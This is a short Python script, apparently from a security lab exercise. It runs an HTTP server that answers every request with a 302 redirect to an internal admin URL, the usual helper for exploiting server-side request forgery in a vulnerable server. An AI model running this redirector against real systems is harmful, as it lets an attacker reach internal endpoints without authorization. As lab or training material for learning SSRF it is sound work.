import http.server
import socketserver

# --- Configuration ---
# Set the URL you want the vulnerable server to be redirected to.
# This is the internal endpoint you are targeting in the lab.
TARGET_URL = "http://localhost/admin" 
PORT = 8000
# -------------------

class RedirectHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"Received request, redirecting to: {TARGET_URL}")
        self.send_response(302) # 302 is a temporary redirect
        self.send_header('Location', TARGET_URL)
        self.end_headers()

# Creates and runs the server
with socketserver.TCPServer(("", PORT), RedirectHandler) as httpd:
    print(f"Redirect server running on port {PORT}")
    print(f"Any request will be redirected to {TARGET_URL}")
    httpd.serve_forever()
